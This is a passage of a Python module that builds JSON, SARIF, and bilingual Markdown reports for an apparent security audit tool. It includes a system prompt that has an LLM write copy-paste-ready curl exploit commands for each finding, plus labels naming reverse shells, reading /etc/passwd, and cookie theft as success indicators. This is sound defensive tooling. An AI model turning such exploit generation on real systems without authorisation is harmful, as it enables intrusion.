"""report/generator.py — JSON, Markdown, and SARIF report generation.

Converts a :class:`ScanResult <scanner.deterministic.ScanResult>` into
human-readable (Markdown) or machine-readable (JSON, SARIF) output.

Markdown reports are generated in **both Chinese and English** — two
separate sections joined by ``<!-- BILINGUAL_SPLIT -->``, which the CLI
layer splits into ``report_cn.md`` and ``report_en.md``.

Usage::

    generator = ReportGenerator()
    text = generator.generate(result, fmt="json", scan_duration_ms=3200)
"""

from __future__ import annotations

import json
import uuid
from datetime import UTC
from typing import Any

try:
    from hyqagent.scanner.deterministic import Finding, ScanResult
except ImportError:  # pragma: no cover
    Finding = Any  # type: ignore[assignment,misc]
    ScanResult = Any  # type: ignore[assignment,misc]

# ── Bilingual label table ─────────────────────────────────────────────────
# All user-facing Markdown labels live here so that _to_markdown_cn() and
# _to_markdown_en() share the same structure but different languages.

_L: dict[str, dict[str, str]] = {
    "cn": {
        "report_title": "HyqAgent 安全审计报告",
        "target_info": "目标信息",
        "assessment_date": "评估日期",
        "audit_mode": "审计模式",
        "target_language": "目标语言",
        "files_scanned": "扫描文件数",
        "scan_duration": "扫描耗时",
        "tool_version": "工具版本",
        "exec_summary": "执行摘要",
        "no_findings": "未发现问题",
        "no_findings_desc": "本次扫描未发现任何确定性漏洞。",
        "no_vulns_prose": (
            "本次审计**未发现任何安全漏洞**。目标代码的安全状况良好，所有检测项均通过。"
        ),
        "findings_prose_prefix": "本次安全审计共发现",
        "findings_prose_suffix": "个安全漏洞",
        "critical_need_fix": "个严重（Critical）漏洞需要**立即修复**",
        "high_risk": "个高危（High）漏洞构成显著风险",
        "medium_risk": "个中危（Medium）漏洞",
        "critical_action": (
            "> 🔴 **立即行动**：存在严重级别漏洞，建议立即组建应急响应小组，"
            "优先修复所有 Critical 级别发现，并在 24 小时内修复所有 High 级别发现。"
        ),
        "high_action": (
            "> 🟠 **建议尽快修复**：存在高危漏洞，建议在本 Sprint 内按照"
            "报告中提供的修复建议完成修复。"
        ),
        "severity_dist": "严重度分布",
        "severity": "严重度",
        "count": "数量",
        "ratio": "占比",
        "category_breakdown": "按漏洞类别汇总",
        "category": "类别",
        "max_severity": "最高严重度",
        "deep_summary_line": "LLM 增强审计",
        "hypotheses_count_unit": "个假设",
        "rounds_unit": "轮收敛",
        "sandbox_confirmed_unit": "沙箱确认",
        "cost_unit": "成本",
        # Finding section labels
        "summary": "概述",
        "vuln_location": "漏洞位置",
        "overview": "概述",
        "impact_label": "影响",
        "prerequisites": "前置条件",
        "exploitation_steps": "利用步骤",
        "code_reference": "代码引用",
        "proof_of_impact": "影响证明",
        "remediation": "修复建议",
        "poc": "PoC (概念验证)",
        "poc_disclaimer": (
            "> ⚠️ 此 PoC 为基于代码分析的假设性验证脚本，未经过在线动态验证。"
            "实际利用前需在测试环境中调整参数。"
        ),
        "poc_verified_disclaimer": (
            "> ✅ 此 PoC 已通过 Docker 沙箱动态验证。"
        ),
        "llm_verification": "LLM 验证",
        "confirmed": "confirmed",
        "rejected": "rejected",
        "inconclusive": "inconclusive",
        # Exploitation steps
        "step_craft_payload": "构造利用 payload",
        "step_send_request": "发送请求至",
        "step_observe": "观察响应——确认",
        "step_taint_flow": "污点数据从源到汇未经适当净化传递",
        "step_location": "位置",
        "step_vuln_code": "漏洞代码",
        "step_test_payload": "测试 payload",
        # Step-3 verify indicators
        "verify_sql": [
            "响应中包含数据库错误信息或异常数据",
            "可通过 UNION-based 或 boolean-based 技术提取数据",
        ],
        "verify_xss": [
            "浏览器中执行 JavaScript（弹窗）",
            "可通过 document.cookie 获取会话 Cookie",
        ],
        "verify_ssrf": [
            "返回内容中包含内部服务的响应",
            "云元数据可见（如 ami-id、security-groups）",
        ],
        "verify_cmd": [
            "响应中显示命令执行输出",
            "攻击者监听器上收到反向 shell 连接",
        ],
        "verify_path_traversal": [
            "响应中包含文件内容（如 /etc/passwd）",
            "可读取预期目录之外的文件",
        ],
        "verify_deser": [
            "发送 payload 后应用崩溃或出现异常行为",
            "确认可执行命令或建立反向 shell",
        ],
        "verify_default": [
            "出现异常行为或错误消息",
            "敏感数据泄露或权限提升",
        ],
        # Appendices
        "appendices": "附录",
        "llm_hypotheses": "LLM 假设详情",
        "dynamic_verification": "动态验证 (沙箱)",
        "poc_example": "PoC 示例",
        "convergence": "收敛信息",
        "rounds": "轮次",
        "status": "状态",
        "reason": "原因",
        "metrics": "指标",
        "llm_cost": "LLM 成本",
        "prompt_tokens": "Prompt tokens",
        "completion_tokens": "Completion tokens",
        "total_cost": "总成本",
        "phases": "执行阶段",
        "coverage": "覆盖率",
        "endpoint_coverage": "端点覆盖",
        "sink_coverage": "Sink 覆盖",
        "blind_spots": "盲区清单",
        "blind_spots_desc": "以下代码路径当前扫描未覆盖，可能存在遗漏的漏洞：",
    },
    "en": {
        "report_title": "HyqAgent Security Audit Report",
        "target_info": "Target Information",
        "assessment_date": "Assessment Date",
        "audit_mode": "Audit Mode",
        "target_language": "Target Language",
        "files_scanned": "Files Scanned",
        "scan_duration": "Scan Duration",
        "tool_version": "Tool Version",
        "exec_summary": "Executive Summary",
        "no_findings": "No Findings",
        "no_findings_desc": "No deterministic vulnerabilities were found in this scan.",
        "no_vulns_prose": (
            "This audit found **no security vulnerabilities**. "
            "The target codebase is in good security standing — all checks passed."
        ),
        "findings_prose_prefix": "This security audit discovered",
        "findings_prose_suffix": "vulnerabilities",
        "critical_need_fix": "critical vulnerabilities requiring **immediate remediation**",
        "high_risk": "high-severity vulnerabilities posing significant risk",
        "medium_risk": "medium-severity vulnerabilities",
        "critical_action": (
            "> 🔴 **Immediate Action Required**: Critical vulnerabilities detected. "
            "Assemble an incident response team, prioritize all Critical findings, "
            "and remediate all High findings within 24 hours."
        ),
        "high_action": (
            "> 🟠 **Prompt Remediation Recommended**: High-severity vulnerabilities "
            "detected. Apply the remediation guidance in this report within the "
            "current sprint."
        ),
        "severity_dist": "Severity Distribution",
        "severity": "Severity",
        "count": "Count",
        "ratio": "Ratio",
        "category_breakdown": "Findings by Category",
        "category": "Category",
        "max_severity": "Max Severity",
        "deep_summary_line": "LLM-Enhanced Audit",
        "hypotheses_count_unit": "hypotheses",
        "rounds_unit": "convergence rounds",
        "sandbox_confirmed_unit": "sandbox-confirmed",
        "cost_unit": "cost",
        # Finding section labels
        "summary": "Summary",
        "vuln_location": "Vulnerable Location",
        "overview": "Overview",
        "impact_label": "Impact",
        "prerequisites": "Prerequisites",
        "exploitation_steps": "Exploitation Steps",
        "code_reference": "Code Reference",
        "proof_of_impact": "Proof of Impact",
        "remediation": "Remediation",
        "poc": "PoC (Proof of Concept)",
        "poc_disclaimer": (
            "> ⚠️ This PoC is a hypothetical verification script based on code "
            "analysis — it has NOT been validated via online dynamic verification. "
            "Adjust parameters in a test environment before exploitation."
        ),
        "poc_verified_disclaimer": (
            "> ✅ This PoC has been validated via Docker sandbox dynamic verification."
        ),
        "llm_verification": "LLM Verification",
        "confirmed": "confirmed",
        "rejected": "rejected",
        "inconclusive": "inconclusive",
        # Exploitation steps
        "step_craft_payload": "Craft exploit payload",
        "step_send_request": "Send the request to",
        "step_observe": "Observe the response — confirm",
        "step_taint_flow": (
            "The tainted data flows from the source to the sink "
            "without proper sanitization"
        ),
        "step_location": "Location",
        "step_vuln_code": "Vulnerable code",
        "step_test_payload": "Test payload",
        # Step-3 verify indicators
        "verify_sql": [
            "Database error messages or unexpected data in the response",
            "Ability to extract data via UNION-based or boolean-based techniques",
        ],
        "verify_xss": [
            "JavaScript execution in the browser (alert popup)",
            "Session cookie accessible via `document.cookie`",
        ],
        "verify_ssrf": [
            "Internal service response in the returned content",
            "Cloud metadata (e.g., `ami-id`, `security-groups`) visible",
        ],
        "verify_cmd": [
            "Command output reflected in the response",
            "Reverse shell connection received on the attacker's listener",
        ],
        "verify_path_traversal": [
            "File contents (e.g., `/etc/passwd`) in the response",
            "Ability to read files outside the intended directory",
        ],
        "verify_deser": [
            "Application crash or unexpected behavior after payload delivery",
            "Reverse shell or command execution confirmed",
        ],
        "verify_default": [
            "Unexpected behavior or error messages",
            "Sensitive data leakage or privilege escalation",
        ],
        # Appendices
        "appendices": "Appendices",
        "llm_hypotheses": "LLM Hypothesis Details",
        "dynamic_verification": "Dynamic Verification (Sandbox)",
        "poc_example": "PoC Example",
        "convergence": "Convergence Information",
        "rounds": "Rounds",
        "status": "Status",
        "reason": "Reason",
        "metrics": "Metrics",
        "llm_cost": "LLM Cost",
        "prompt_tokens": "Prompt Tokens",
        "completion_tokens": "Completion Tokens",
        "total_cost": "Total Cost",
        "phases": "Execution Phases",
        "coverage": "Coverage",
        "endpoint_coverage": "Endpoint Coverage",
        "sink_coverage": "Sink Coverage",
        "blind_spots": "Blind Spot Manifest",
        "blind_spots_desc": (
            "The following code paths were not covered by the current scan "
            "and may harbor undiscovered vulnerabilities:"
        ),
    },
}

# ── Bilingual split marker ────────────────────────────────────────────────
BILINGUAL_SPLIT = "\n\n<!-- BILINGUAL_SPLIT -->\n\n"


class ReportGenerator:
    """Generate scan reports in JSON, Markdown, or SARIF format.

    Markdown reports are always produced in both Chinese and English.
    The returned string contains both versions separated by
    ``<!-- BILINGUAL_SPLIT -->``.  The CLI layer splits them into
    ``report_cn.md`` and ``report_en.md``.

    Parameters
    ----------
        poc_llm: Optional async callable ``(system_prompt, user_prompt) -> str``
            for LLM-powered PoC generation.  When provided, PoCs are generated
            by analyzing the actual code context with an LLM.  When ``None``
            (quick scan / no API keys), heuristic code analysis is used instead.

    """

    def __init__(
        self,
        poc_llm: Any = None,
    ) -> None:
        self._poc_llm = poc_llm

    # ── LLM-powered PoC enrichment ────────────────────────────────────

    async def enrich_findings_pocs(
        self,
        findings: list[Any],
        language: str = "python",
    ) -> None:
        """Enrich findings with LLM-generated PoCs (deep audit only).

        Calls ``self._poc_llm`` for each finding that lacks a verified PoC
        and stores the LLM output in ``finding.poc``.  No-op when
        ``_poc_llm`` is ``None`` (quick-scan / no API keys).

        Args:
            findings: List of :class:`Finding` objects to enrich.
            language: Programming language for context in the prompt.

        """
        if self._poc_llm is None:
            return

        import asyncio

        import structlog

        _log = structlog.get_logger(__name__)
        sem = asyncio.Semaphore(3)  # Limit concurrent LLM calls

        async def _enrich_one(finding: Any) -> None:
            async with sem:
                try:
                    poc_text = await self._llm_enhance_poc(finding, language)
                    if poc_text:
                        finding.poc = poc_text
                except Exception:
                    # PoC enrichment is best-effort; never block report gen
                    _log.debug("poc_llm_enrich_failed", exc_info=True)

        tasks = [_enrich_one(f) for f in findings]
        await asyncio.gather(*tasks)

    async def _llm_enhance_poc(
        self,
        finding: Any,
        language: str,
    ) -> str:
        """Call the LLM to generate an enhanced PoC for a single finding.

        Returns the LLM-generated PoC text, or empty string on failure.
        """
        if self._poc_llm is None:
            return ""

        cwe_id = getattr(finding, "cwe_id", "")
        category = getattr(finding, "category", "")
        vuln_type = category.split(",")[0].strip() if category else ""
        endpoint = getattr(finding, "endpoint", "")
        http_method = getattr(finding, "http_method", "GET")
        http_params = getattr(finding, "http_params", "")
        file_path = getattr(finding, "file_path", "")
        line_num = getattr(finding, "line", 0)
        code_snippet = getattr(finding, "code_snippet", "")
        source_location = getattr(finding, "source_location", "")
        sink_location = getattr(finding, "sink_location", "")
        title = getattr(finding, "title", "")
        description = getattr(finding, "description", "")

        system_prompt = (
            "You are a security researcher writing proof-of-concept (PoC) "
            "exploit documentation for a code audit report. "
            "Write in Chinese. Be specific and concrete — reference the actual "
            "endpoint, parameters, variable names, and code locations provided. "
            "Include: (1) a brief explanation of how the vulnerability manifests "
            "in THIS specific code, (2) a copy-paste-ready curl command with the "
            "payload, (3) expected result upon successful exploitation. "
            "Format in Markdown. Keep it under 2000 characters."
        )

        user_prompt = f"""Generate a code-specific PoC for the following finding:

**Vulnerability**: {title}
**Type**: {vuln_type} ({cwe_id})
**File**: {file_path}:{line_num}
**Source (taint entry)**: {source_location}
**Sink (vulnerable point)**: {sink_location}
**Endpoint**: {http_method} {endpoint}
**Parameters**: {http_params}
**Language**: {language}

**Vulnerable code**:
```
{code_snippet[:1500]}
```

**Finding description**: {description[:500]}"""

        return await self._poc_llm(system_prompt, user_prompt)

    # ── Public API ────────────────────────────────────────────────────

    def generate(
        self,
        result: ScanResult,
        fmt: str = "json",
        scan_duration_ms: int = 0,
        files_scanned: int = 0,
        language: str = "",
        mode: str = "quick",
        hypotheses: list[Any] | None = None,
        convergence: Any = None,
        cost_summary: Any = None,
        completeness_review: dict[str, Any] | None = None,
        coverage_audit: Any = None,
        phases_completed: list[str] | None = None,
        validations: list[Any] | None = None,
        dynamic_verification_results: list[Any] | None = None,
    ) -> str:
        """Generate a report in *fmt* format.

        Args:
            result: The :class:`ScanResult` from :meth:`DeterministicScanner.scan_all`.
            fmt: One of ``"json"``, ``"markdown"``, ``"sarif"``.
            scan_duration_ms: Total scan duration in milliseconds.
            files_scanned: Number of source files processed.
            language: Programming language scanned.
            mode: ``"quick"`` (deterministic only) or ``"deep"`` (LLM-augmented).
            hypotheses: LLM-generated hypotheses (deep mode only).
            convergence: :class:`ConvergenceReport` (deep mode only).
            cost_summary: :class:`CostSummary` (deep mode only).
            completeness_review: Completeness critic output (deep mode only).
            coverage_audit: :class:`CoverageAuditResult` (deep mode only).
            phases_completed: List of completed phase names (deep mode only).
            validations: :class:`ValidationResult` list (deep mode only).
            dynamic_verification_results: Dynamic verification output (deep mode only).

        """
        # Build a deep-audit context dict for format methods
        deep_ctx: dict[str, Any] | None = None
        if mode == "deep":
            deep_ctx = {
                "mode": mode,
                "hypotheses": hypotheses or [],
                "convergence": convergence,
                "cost_summary": cost_summary,
                "completeness_review": completeness_review,
                "coverage_audit": coverage_audit,
                "phases_completed": phases_completed or [],
                "validations": validations or [],
                "dynamic_verification_results": dynamic_verification_results or [],
            }

        if fmt in ("markdown", "md"):
            cn = self._to_markdown(
                result, scan_duration_ms, files_scanned, language, deep_ctx, lang="cn",
            )
            en = self._to_markdown(
                result, scan_duration_ms, files_scanned, language, deep_ctx, lang="en",
            )
            return cn + BILINGUAL_SPLIT + en

        if fmt == "sarif":
            return self._to_sarif(result, scan_duration_ms, files_scanned, language)

        return self._to_json(result, scan_duration_ms, files_scanned, language, deep_ctx)

    # ── JSON ──────────────────────────────────────────────────────────

    def _to_json(
        self,
        result: ScanResult,
        scan_duration_ms: int,
        files_scanned: int,
        language: str,
        deep_ctx: dict[str, Any] | None = None,
    ) -> str:
        """Produce a rich JSON report."""
        # Build simplified annotated-path summaries
        path_summaries: list[dict[str, Any]] = []
        for ap in getattr(result, "annotated_paths", []) or []:
            label = ap.label.value if hasattr(ap.label, "value") else str(ap.label)
            ss = ap.sanitizer_status
            sanitizer_status = ss.value if hasattr(ss, "value") else str(ss) if ss else None
            path_summaries.append(
                {
                    "label": label,
                    "sanitizer_status": sanitizer_status,
                    "node_count": len(getattr(ap.path, "nodes", [])),
                }
            )

        # Count labels
        from collections import Counter

        label_counts = Counter(ps["label"] for ps in path_summaries)

        output: dict[str, Any] = {
            "scan_info": {
                "version": self._resolve_version(),
                "mode": deep_ctx["mode"] if deep_ctx is not None else "quick",
                "duration_ms": scan_duration_ms,
                "files_scanned": files_scanned,
                "language": language,
                "timestamp": self._timestamp(),
            },
            "findings": [self._finding_to_dict(f) for f in (getattr(result, "findings", []) or [])],
            "annotated_paths": [
                {"label": label, "count": count} for label, count in sorted(label_counts.items())
            ],
            "coverage": self._coverage_dict(result),
            "blind_spot_manifest": self._blind_spot_list(result),
            "stats": getattr(result, "stats", {}) or {},
        }

        # ── Deep audit sections ───────────────────────────────────
        if deep_ctx is not None:
            ctx: dict[str, Any] = deep_ctx

            # Hypotheses summary
            hypotheses: list[dict[str, Any]] = []
            for h in ctx.get("hypotheses", []):
                hypotheses.append(
                    {
                        "id": getattr(h, "id", ""),
                        "title": getattr(h, "title", ""),
                        "vuln_type": getattr(h, "vuln_type", ""),
                        "cwe_id": getattr(h, "cwe_id", ""),
                        "severity": getattr(h, "severity", ""),
                        "confidence": getattr(h, "confidence", 0.0),
                        "source_location": getattr(h, "source_location", ""),
                        "sink_location": getattr(h, "sink_location", ""),
                    }
                )
            output["hypotheses"] = hypotheses

            # Validations summary
            validations: list[dict[str, Any]] = []
            for v in ctx.get("validations", []):
                validations.append(
                    {
                        "hypothesis_id": getattr(v, "hypothesis_id", ""),
                        "verdict": str(getattr(v, "verdict", "")),
                        "evidence_strength": str(getattr(v, "evidence_strength", "")),
                    }
                )
            output["validations"] = validations

            # Convergence
            conv = ctx.get("convergence")
            if conv is not None:
                output["convergence"] = {
                    "summary": getattr(conv, "summary", str(conv)),
                    "rounds": getattr(conv, "round", 0),
                    "status": str(getattr(conv, "recommendation", "unknown")),
                }

            # Cost
            cost = ctx.get("cost_summary")
            if cost is not None:
                output["cost"] = {
                    "total_cost": getattr(cost, "total_cost", 0.0),
                    "prompt_tokens": getattr(cost, "total_input_tokens", 0),
                    "completion_tokens": getattr(cost, "total_output_tokens", 0),
                    "total_tokens": (
                        getattr(cost, "total_input_tokens", 0)
                        + getattr(cost, "total_output_tokens", 0)
                    ),
                }

            # Deep audit meta
            output["deep_audit"] = {
                "phases_completed": ctx.get("phases_completed", []),
                "hypotheses_count": len(hypotheses),
                "validations_count": len(validations),
                "convergence_rounds": (getattr(conv, "round", 0) if conv is not None else 0),
                "total_llm_cost": (getattr(cost, "total_cost", 0.0) if cost is not None else 0.0),
            }

        return json.dumps(output, ensure_ascii=False, indent=2)

    # ── Markdown ──────────────────────────────────────────────────────

    def _to_markdown(
        self,
        result: ScanResult,
        scan_duration_ms: int,
        files_scanned: int,
        language: str,
        deep_ctx: dict[str, Any] | None = None,
        lang: str = "cn",
    ) -> str:
        """Produce a Shannon-style human-readable Markdown report.

        Args:
            result: Aggregated scan result with findings and coverage data.
            scan_duration_ms: Total scan wall-clock time in milliseconds.
            files_scanned: Number of source files that were scanned.
            language: Programming language of the scanned codebase.
            deep_ctx: Optional deep-audit phase data (hypotheses, costs, etc.).
            lang: Report language — ``"cn"`` for Chinese, ``"en"`` for English.

        Report structure:
        1. Target Information
        2. Executive Summary (prose + severity table + category breakdown)
        3. Findings grouped by OWASP vulnerability category
        4. Appendices (LLM data, coverage, blind spots — deep mode only)

        Args:
            lang: ``"cn"`` for Chinese, ``"en"`` for English.

        """
        labels = _L[lang]
        findings = getattr(result, "findings", []) or []
        is_deep = deep_ctx is not None
        if lang == "cn":
            mode_label = "deep (LLM 增强)" if is_deep else "quick (零 LLM 确定性)"
        else:
            mode_label = "deep (LLM enhanced)" if is_deep else "quick (zero-LLM deterministic)"

        # Enrich findings with deep audit cross-reference data
        enriched: list[Any] = self._enrich_findings(
            list(findings), deep_ctx, lang=lang,
        )

        # ── Title ──
        lines: list[str] = [
            f"# {labels['report_title']}",
            "",
        ]

        # ── 1. Target Information ──
        lines.extend(
            self._build_target_info_table(
                language, files_scanned, scan_duration_ms, mode_label, lang=lang,
            )
        )

        # ── 2. Executive Summary ──
        lines.extend(self._build_executive_summary(enriched, deep_ctx, lang=lang))

        # ── 3. Findings by OWASP Category ──
        if enriched:
            grouped = self._group_findings_by_owasp(enriched)
            for cat_name in self._category_display_order():
                cat_findings = grouped.get(cat_name)
                if not cat_findings:
                    continue
                lines.extend(
                    self._build_category_section(cat_name, cat_findings, language, lang=lang)
                )
            lines.append("")
        else:
            lines.append(f"## ✅ {labels['no_findings']}")
            lines.append("")
            lines.append(labels["no_findings_desc"])
            lines.append("")

        # ── 4. Appendices (deep mode) ──
        lines.extend(self._build_appendices(result, deep_ctx, lang=lang))

        return "\n".join(lines)

    # ── Markdown building blocks ──────────────────────────────────────

    @staticmethod
    def _build_target_info_table(
        language: str,
        files_scanned: int,
        scan_duration_ms: int,
        mode_label: str,
        lang: str = "cn",
    ) -> list[str]:
        """Build the Target Information section."""
        labels = _L[lang]

        lines: list[str] = [
            f"## 📋 {labels['target_info']}",
            "",
            f"| {labels['assessment_date']} | {labels['assessment_date']} |" if False else "",
        ]
        # Build table with translated headers
        lines = [
            f"## 📋 {labels['target_info']}",
            "",
            f"| {labels['assessment_date']} | {ReportGenerator._timestamp()} |",
            f"| {labels['audit_mode']} | {mode_label} |",
            f"| {labels['target_language']} | {language or 'auto'} |",
            f"| {labels['files_scanned']} | {files_scanned} |",
            f"| {labels['scan_duration']} | {ReportGenerator._format_duration(scan_duration_ms)} |",
            f"| {labels['tool_version']} | HyqAgent {ReportGenerator._resolve_version()} |",
            "",
        ]
        return lines

    @staticmethod
    def _build_executive_summary(
        findings: list[Any],
        deep_ctx: dict[str, Any] | None,
        lang: str = "cn",
    ) -> list[str]:
        """Build the Executive Summary section with prose and tables."""
        from collections import Counter

        from hyqagent.report.templates import lookup_owasp_category

        labels = _L[lang]

        lines: list[str] = [
            f"## 📊 {labels['exec_summary']}",
            "",
        ]

        total = len(findings)
        if total == 0:
            lines.append(labels["no_vulns_prose"])
            lines.append("")
            return lines

        sev_counts = Counter(getattr(f, "severity", "unknown") for f in findings)
        critical = sev_counts.get("critical", 0)
        high = sev_counts.get("high", 0)
        medium = sev_counts.get("medium", 0)

        # Prose summary
        parts: list[str] = [
            f"{labels['findings_prose_prefix']} **{total}** {labels['findings_prose_suffix']}"
        ]
        if critical:
            parts.append(f"**{critical}** {labels['critical_need_fix']}")
        if high:
            parts.append(f"**{high}** {labels['high_risk']}")
        if medium:
            parts.append(f"**{medium}** {labels['medium_risk']}")
        if lang == "cn":
            lines.append("，".join(parts) + "。")
        else:
            lines.append(", ".join(parts) + ".")
        lines.append("")

        if critical > 0:
            lines.append(labels["critical_action"])
        elif high > 0:
            lines.append(labels["high_action"])
        lines.append("")

        # Severity distribution table
        lines.append(f"### {labels['severity_dist']}")
        lines.append("")
        lines.append(f"| {labels['severity']} | {labels['count']} | {labels['ratio']} |")
        lines.append("|--------|------|------|")
        sev_emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}
        for sev in ("critical", "high", "medium", "low"):
            c = sev_counts.get(sev, 0)
            if c > 0:
                pct = f"{c / total * 100:.0f}%"
                lines.append(f"| {sev_emoji.get(sev, '⚪')} {sev} | {c} | {pct} |")
        lines.append("")

        # Category breakdown table
        lines.append(f"### {labels['category_breakdown']}")
        lines.append("")
        lines.append(f"| {labels['category']} | {labels['count']} | {labels['max_severity']} |")
        lines.append("|------|------|-----------|")

        cat_aggs: dict[tuple[str, str], dict[str, Any]] = {}
        sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1, "unknown": 0}
        for f in findings:
            category = getattr(f, "category", "")
            primary = category.split(",")[0].strip() if category else ""
            _, prefix, display_name = lookup_owasp_category(primary)
            key = (prefix, display_name)
            if key not in cat_aggs:
                cat_aggs[key] = {"count": 0, "max_sev": "low", "max_rank": 0}
            cat_aggs[key]["count"] += 1
            sev = getattr(f, "severity", "low")
            rank = sev_rank.get(sev, 0)
            if rank > cat_aggs[key]["max_rank"]:
                cat_aggs[key]["max_sev"] = sev
                cat_aggs[key]["max_rank"] = rank

        for (_prefix, display_name), ag in sorted(
            cat_aggs.items(), key=lambda x: x[1]["count"], reverse=True
        ):
            icon = sev_emoji.get(ag["max_sev"], "⚪")
            lines.append(f"| {icon} {display_name} | {ag['count']} | {ag['max_sev']} |")
        lines.append("")

        # Deep audit summary line
        if deep_ctx is not None:
            ctx = deep_ctx
            cost = ctx.get("cost_summary")
            conv = ctx.get("convergence")
            dv_results = ctx.get("dynamic_verification_results", [])
            confirmed_dv = sum(1 for r in dv_results if r.get("verdict") == "confirmed")
            hyp_count = len(ctx.get("hypotheses", []))

            lines.append(
                f"*{labels['deep_summary_line']}：{hyp_count} {labels['hypotheses_count_unit']} · "
                f"{getattr(conv, 'round', '?')} {labels['rounds_unit']} · "
            )
            cost_str = f"${getattr(cost, 'total_cost', 0.0):.4f}" if cost else "N/A"
            if confirmed_dv:
                lines[-1] += f"{confirmed_dv} {labels['sandbox_confirmed_unit']} · "
            lines[-1] += f"{labels['cost_unit']} {cost_str}*"
            lines.append("")

        return lines

    @staticmethod
    def _group_findings_by_owasp(
        findings: list[Any],
    ) -> dict[str, list[Any]]:
        """Group findings by their OWASP category section name."""
        from hyqagent.report.templates import lookup_owasp_category

        counters: dict[str, int] = {}
        grouped: dict[str, list[Any]] = {}

        for f in findings:
            category = getattr(f, "category", "")
            primary = category.split(",")[0].strip() if category else ""
            section_name, prefix, _display_name = lookup_owasp_category(primary)
            if prefix not in counters:
                counters[prefix] = 0
            counters[prefix] += 1
            f._display_id = f"{prefix}-{counters[prefix]:03d}"
            grouped.setdefault(section_name, []).append(f)

        return grouped

    @staticmethod
    def _category_display_order() -> list[str]:
        """Canonical ordering of OWASP category section names."""
        from hyqagent.report.templates import get_category_order

        return get_category_order()

    def _build_category_section(
        self,
        cat_name: str,
        cat_findings: list[Any],
        language: str,
        lang: str = "cn",
    ) -> list[str]:
        """Build a single OWASP-category H1 section with all its findings."""
        lines: list[str] = []
        lines.append("---")
        lines.append("")
        lines.append(f"# {cat_name}")
        lines.append("")

        for f in cat_findings:
            lines.extend(self._build_finding_shannon_style(f, language, lang=lang))
            lines.append("---")
            lines.append("")

        return lines

    def _build_finding_shannon_style(
        self,
        f: Any,
        language: str,
        lang: str = "cn",
    ) -> list[str]:
        """Render a single finding in Shannon-style format.

        Structure: Summary → Prerequisites → Exploitation Steps →
        PoC → Code Reference → Proof of Impact → Remediation.
        """
        from hyqagent.report.templates import (
            cvss_severity_label,
            lookup_cwe_name,
            lookup_owasp_category,
            lookup_prerequisites,
            lookup_proof_of_impact,
        )

        labels = _L[lang]
        lines: list[str] = []

        # ── Header line ──
        disp_id = getattr(f, "_display_id", getattr(f, "id", "???"))
        title = getattr(f, "title", "Untitled")
        sev = getattr(f, "severity", "medium")
        cwe_id = getattr(f, "cwe_id", "")
        cvss_score = getattr(f, "cvss_score", 0.0)

        sev_emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}.get(sev, "⚪")
        cwe_label = ""
        if cwe_id:
            cwe_name = lookup_cwe_name(cwe_id, lang=lang)
            cwe_label = f"{cwe_id}: {cwe_name}" if cwe_name else cwe_id
        cvss_label = ""
        if cvss_score > 0:
            cvss_label = f"CVSS {cvss_score} ({cvss_severity_label(cvss_score)})"

        header_parts = [f"### {sev_emoji} {disp_id}: {title}"]
        header_parts.append(f"[{sev.upper()}]")
        if cwe_label:
            header_parts.append(cwe_label)
        if cvss_label:
            header_parts.append(cvss_label)
        lines.append(" ".join(header_parts))
        lines.append("")

        # ── LLM Verification badge ──
        val_verdict = getattr(f, "validation_verdict", "")
        if val_verdict:
            val_conf = getattr(f, "validation_confidence", 0.0)
            val_reasoning = getattr(f, "validation_reasoning", "")
            verdict_emoji = {
                "confirmed": "✅",
                "rejected": "❌",
                "inconclusive": "❓",
            }.get(val_verdict, "❓")
            verdict_cn = {
                "confirmed": "LLM 已验证 — 确认",
                "rejected": "LLM 已验证 — 已排除 (可能为误报)",
                "inconclusive": "LLM 已验证 — 无法确定",
            }
            verdict_en = {
                "confirmed": "LLM Verified — Confirmed",
                "rejected": "LLM Verified — REJECTED (Likely False Positive)",
                "inconclusive": "LLM Verified — Inconclusive",
            }
            if lang == "cn":
                verdict_label = verdict_cn.get(val_verdict, val_verdict)
                confidence_label = f"置信度: {val_conf:.0%}"
            else:
                verdict_label = verdict_en.get(val_verdict, val_verdict)
                confidence_label = f"confidence: {val_conf:.0%}"
            lines.append(
                f"> {verdict_emoji} **{verdict_label}** "
                f"({confidence_label})"
            )
            if val_reasoning:
                lines.append(f"> _{val_reasoning[:200]}_")
            lines.append("")

        # ── Summary ──
        lines.append(f"#### {labels['summary']}")
        lines.append("")

        src_loc = getattr(f, "source_location", "")
        sink_loc = getattr(f, "sink_location", "")
        file_path = getattr(f, "file_path", "")
        line_num = getattr(f, "line", 0)
        desc = getattr(f, "description", "")
        impact_text = getattr(f, "impact", "")
        category = getattr(f, "category", "")
        primary_vuln = category.split(",")[0].strip() if category else ""
        _, __, display_type = lookup_owasp_category(primary_vuln)

        # Vulnerable location
        if src_loc and sink_loc:
            lines.append(f"- **{labels['vuln_location']}:** `{src_loc}` → `{sink_loc}`")
        elif file_path:
            lines.append(f"- **{labels['vuln_location']}:** `{file_path}:{line_num}`")
        else:
            lines.append(f"- **{labels['vuln_location']}:** `{file_path or 'unknown'}:{line_num}`")

        # Overview
        if desc:
            lines.append(f"- **{labels['overview']}:** {desc}")
        else:
            if lang == "cn":
                lines.append(
                    f"- **{labels['overview']}:** {display_type} 漏洞，通过污点分析检测到"
                )
            else:
                lines.append(
                    f"- **{labels['overview']}:** {display_type} vulnerability "
                    f"detected via taint analysis"
                )
        # Impact (concise)
        if impact_text:
            first_line = impact_text.split("\n")[0].strip()
            lines.append(f"- **{labels['impact_label']}:** {first_line}")
        lines.append("")

        # ── Prerequisites ──
        lines.append(f"**{labels['prerequisites']}:**")
        lines.append("")
        prereqs = lookup_prerequisites(primary_vuln, lang=lang) if primary_vuln else ""
        if prereqs:
            lines.append(prereqs)
        else:
            if lang == "cn":
                lines.append("- 攻击者可以访问受影响的功能端点")
            else:
                lines.append("- The attacker can access the affected endpoint")
        lines.append("")

        # ── Exploitation Steps ──
        lines.extend(self._build_exploitation_steps(f, lang=lang))
        lines.append("")

        # ── PoC (Proof of Concept) — ALWAYS included ──
        lines.extend(self._build_poc_section(f, language, lang=lang))
        lines.append("")

        # ── Code Reference ──
        lines.append(f"**{labels['code_reference']}:**")
        lines.append("")
        code = getattr(f, "code_snippet", "")
        if code:
            lang_name = language or ""
            lines.append(f"```{lang_name}")
            lines.append(code.strip())
            lines.append("```")
        elif file_path:
            if lang == "cn":
                lines.append(f"参见 `{file_path}:{line_num}`")
            else:
